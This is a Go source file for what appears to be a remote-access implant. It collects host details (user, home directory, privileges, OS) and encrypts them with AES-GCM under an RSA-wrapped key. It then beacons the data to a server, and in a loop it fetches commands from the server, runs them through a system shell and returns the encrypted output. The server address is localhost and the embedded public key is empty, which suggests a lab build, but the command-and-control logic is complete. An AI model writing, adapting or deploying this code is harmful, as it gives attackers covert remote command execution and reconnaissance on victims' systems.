package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const pubkey string = ``

type hostinfo struct {
	pid   int
	user  string
	home  string
	pwd   string
	privs int
	os    string
	cpu   string
}

func gatherHost() ([]hostinfo, error) {
	var hosts []hostinfo
	currentHost := hostinfo{
		pid:   os.Getpid(),
		user:  os.Getenv("USER"),
		home:  os.Getenv("HOME"),
		pwd:   func() string { p, _ := os.Getwd(); return p }(),
		privs: os.Geteuid(),
		os:    runtime.GOOS,
		cpu:   runtime.GOARCH,
	}
	hosts = append(hosts, currentHost)
	return hosts, nil
}

func sendInfo(data []byte, url string) (body []byte, err error) {
	encodedData := base64.StdEncoding.EncodeToString(data)
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(encodedData))
	if err != nil {
		fmt.Printf("error creating request: %v\n", err)
		return nil, err
	}
	req.Header.Set("Content-Type", "application/base64")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("error sending request: %v\n", err)
		return nil, err
	}
	defer resp.Body.Close()
	fmt.Printf("Response Status: %s\n", resp.Status)
	body, err = io.ReadAll(resp.Body)
	return body, err
}

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), fmt.Errorf("command failed: %w", err)
	}
	
	return string(output), nil
}

func awaitCommand(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("failed to get command: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return "", nil
	}

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("server returned status: %s", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %w", err)
	}

	return strings.TrimSpace(string(body)), nil
}

func main() {
	hosts, _ := gatherHost()
	for _, h := range hosts {
		info := fmt.Sprintf("PID: %d\nUser: %s\nHome: %s\nPWD: %s\nPrivs: %d\nOS: %s\nCPU: %s\n",
			h.pid, h.user, h.home, h.pwd, h.privs, h.os, h.cpu)
		enc, enckey, err := encrypt([]byte(info))
		if err != nil {
			fmt.Println("[+] encryption failed")
		}
		payload := append(enc, enckey...)
		sendInfo([]byte(payload), "http://localhost:8080/test")
	}

	for {
		command, err := awaitCommand("http://localhost:8080/exec")
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		if command == "" {
			time.Sleep(2 * time.Second)
			continue
		}

		output, err := executeCommand(command)
		if err != nil {
			output = fmt.Sprintf("ERROR: %v", err)
		}

		enc, enckey, err := encrypt([]byte(output))
		if err != nil {
			fmt.Println("[+] encryption failed")
			continue
		}
		resultPayload := append(enc, enckey...)
		sendInfo([]byte(resultPayload), "http://localhost:8080/test")
	}
}

func encrypt(info []byte) (encbytes []byte, enckey []byte, err error) {
	key, _ := keygen(32)
	enckey, _ = encryptKeyWithRSA(pubkey, key)
	c, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(c)
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}
	ciphertext := gcm.Seal(nonce, nonce, info, nil)
	return ciphertext, enckey, err
}

func keygen(keySize int) ([]byte, error) {
	key := make([]byte, keySize)
	_, err := rand.Read(key)
	if err != nil {
		return nil, fmt.Errorf("failed to generate random key: %w", err)
	}
	return key, nil
}

func encryptKeyWithRSA(pubPEM string, key []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(pubPEM))
	if block == nil {
		return nil, fmt.Errorf("failed to decode public key PEM")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse public key: %w", err)
	}

	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA public key")
	}

	encryptedKey, err := rsa.EncryptOAEP(
		sha256.New(), rand.Reader, rsaPub, key, nil,
	)
	if err != nil {
		return nil, fmt.Errorf("RSA encryption failed: %w", err)
	}

	return encryptedKey, nil
}
